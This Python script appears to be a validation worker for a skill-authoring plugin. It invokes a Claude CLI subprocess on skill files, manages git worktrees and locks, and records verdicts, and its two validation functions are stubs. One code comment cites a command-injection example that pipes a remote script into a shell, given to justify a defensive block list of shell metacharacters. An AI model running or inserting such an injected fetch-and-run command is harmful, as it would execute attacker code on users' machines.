#!/usr/bin/env python3
"""Tier A validation worker (parent spec 7; slice D2 design).

Two modes, one process, always detached:
  critique   -- can a fresh instance FOLLOW this text? runs on every skill.
  executable -- does following it make its own verification pass?

Failure is always silent: exit 0, nothing on stdout. A validation that
cannot run is `inconclusive`, never `fail` -- a timeout is not evidence
about a skill.
"""
import argparse
import contextlib
import fcntl
import os
import shlex
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import ledger
import retrieve
import trust

MODEL_TIMEOUT_S = 300
VERIFY_TIMEOUT_S = 120
DEFAULT_MODEL = "sonnet"
# Refused rather than escaped: a skill file is attacker-controlled text, and
# `stripe trigger x; curl evil.sh | sh` must never be something this runs.
SHELL_METACHARACTERS = set(";&|<>`$(){}[]*?!\n\\\"'")


def run_model(prompt, cwd, model=None, timeout=MODEL_TIMEOUT_S):
    """One `claude -p` turn; the text, or None on any failure.

    --safe-mode is both the recursion guard and the auth choice: it disables
    hooks in the child while leaving subscription OAuth intact. --bare would
    force ANTHROPIC_API_KEY and turn every validation into an API bill.
    """
    argv = ["claude", "-p", "--safe-mode", "--no-session-persistence",
            "--output-format", "text", "--model",
            model or os.environ.get("SKILLFORGE_VALIDATE_MODEL", DEFAULT_MODEL)]
    try:
        proc = subprocess.run(
            argv, cwd=str(cwd), input=prompt.encode("utf-8"),
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=timeout,
            env=dict(os.environ, SKILLFORGE_DRAFTING="1"))
    except (OSError, subprocess.SubprocessError):
        return None
    if proc.returncode != 0:
        return None
    return proc.stdout.decode("utf-8", "replace").strip()


def run_verification(argv, cwd, timeout=VERIFY_TIMEOUT_S):
    """Exit code, or None if the command could not be run at all.

    None and a non-zero exit mean different things: None is `inconclusive`
    (we learned nothing), non-zero is a real failing verification.
    """
    try:
        proc = subprocess.run(
            argv, cwd=str(cwd), stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            timeout=timeout, env=dict(os.environ, SKILLFORGE_DRAFTING="1"))
    except (OSError, subprocess.SubprocessError):
        return None
    return proc.returncode


def make_worktree(repo, dest):
    """Detached worktree of `repo` at HEAD. True on success."""
    try:
        subprocess.run(["git", "worktree", "add", "--detach", str(dest), "HEAD"],
                       cwd=str(repo), stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL, timeout=60, check=True)
    except (OSError, subprocess.SubprocessError):
        return False
    return True


def remove_worktree(repo, dest):
    try:
        subprocess.run(["git", "worktree", "remove", "--force", str(dest)],
                       cwd=str(repo), stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL, timeout=60)
    except (OSError, subprocess.SubprocessError):
        pass


@contextlib.contextmanager
def lock_for(name, mode):
    """Advisory lock; yields True if acquired, False if another holder has it.

    The lock is the process, not a status row: D1 guards its drafter with a
    `drafting` row because that row IS the delivery queue and must exist
    mid-flight. A validation row is only a result, so the kernel releasing
    this lock on process death is exact where a wall-clock reaper is a guess.
    """
    d = Path.home() / ".claude" / "skillforge" / "locks"
    d.mkdir(parents=True, exist_ok=True)
    safe = "".join(c for c in name if c.isalnum() or c in "-_") or "unnamed"
    fd = os.open(str(d / ("%s.%s.lock" % (safe, mode))),
                 os.O_CREAT | os.O_RDWR, 0o600)
    try:
        try:
            fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except OSError:
            yield False
            return
        yield True
    finally:
        os.close(fd)


def skill_entry(name):
    """The index entry for `name`, or None."""
    for e in (retrieve.load_index() or {}).get("entries", []):
        if e.get("name") == name:
            return e
    return None


def critique(text, entry, plugin_root):
    return "inconclusive", None


def executable(text, entry):
    return "inconclusive", None


def main(argv=None):
    if os.environ.get("SKILLFORGE_DRAFTING"):
        return 0
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("mode", choices=("critique", "executable"))
    ap.add_argument("--skill", required=True)
    ap.add_argument("--plugin-root",
                    default=str(Path(__file__).resolve().parent.parent))
    try:
        args = ap.parse_args(argv)
    except SystemExit:
        # argparse's own error/--help path calls sys.exit() directly, which
        # would blow straight past every `return 0` below. It already writes
        # its message to stderr, never stdout, so converting to a plain
        # return here costs nothing and keeps the "always exits 0" contract.
        return 0
    try:
        entry = skill_entry(args.skill)
        if entry is None:
            return 0
        text = Path(entry["path"]).read_text(encoding="utf-8")
        h = trust.content_hash(text)
        if ledger.validations_for({args.skill: h}).get(args.skill, {}).get(args.mode):
            return 0                      # already answered for this exact text
        with lock_for(args.skill, args.mode) as got:
            if not got:
                return 0
            if args.mode == "critique":
                verdict, detail = critique(text, entry, args.plugin_root)
            else:
                verdict, detail = executable(text, entry)
            ledger.record_validation(args.skill, h, args.mode, verdict,
                                     detail=detail)
    except Exception as err:
        print("skillforge: validate failed: %s" % err, file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
